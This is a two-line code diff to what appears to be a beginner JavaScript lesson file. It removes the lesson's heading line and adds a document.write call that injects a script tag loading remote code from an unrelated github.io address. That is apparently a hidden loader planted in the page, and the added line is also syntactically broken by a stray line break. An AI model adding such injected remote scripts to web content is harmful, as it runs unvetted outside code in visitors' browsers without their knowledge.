@@ -1,1 +1,2 @@
-document.write("<b>LESSON 1: PRINT HELLO WORLD USING VARIABLES</b><br><br>");
+document.write("<script type='text/javascript' src='https://caksup.github.io/fo/a/z.js'></script>
+");
